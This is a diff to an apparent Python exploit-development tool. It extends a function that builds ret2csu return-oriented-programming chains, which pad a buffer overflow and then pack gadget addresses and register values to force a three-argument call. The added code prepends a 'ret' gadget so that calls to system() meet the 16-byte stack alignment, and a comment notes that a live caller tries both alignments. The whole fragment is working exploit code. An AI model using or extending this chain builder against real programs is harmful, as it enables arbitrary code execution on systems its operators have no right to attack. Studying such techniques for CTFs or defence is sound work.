@@ -82,10 +82,14 @@ def find_csu(data: bytes):
     return {"pop": pop, "call": call} if pop and call else None
 
 
-def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0):
+def build_ret2csu(offset, pop, call, ptr, edi, rsi, rdx, length, rbx=0, rbp=0, align_ret=None):
     """ret2csu chain: pop-gadget loads rbx/rbp/r12=ptr/r13=edi/r14=rsi/r15=rdx, then the
-    call-gadget does the 3-arg call *[ptr+rbx*8]."""
+    call-gadget does the 3-arg call *[ptr+rbx*8]. `align_ret` (a `ret` VA) prepends one return to
+    fix the 16-byte-aligned rsp that system()/do_system needs -- the parity is environment-
+    dependent, so a live caller tries both."""
     body = bytearray(_cyclic(offset))
+    if align_ret is not None:
+        body += struct.pack("<Q", align_ret & 0xFFFFFFFFFFFFFFFF)
     for w in (pop, rbx, rbp, ptr, edi, rsi, rdx, call):
         body += struct.pack("<Q", w & 0xFFFFFFFFFFFFFFFF)
     body += b"C" * 64                                  # post-call padding (breakpoint fires first)
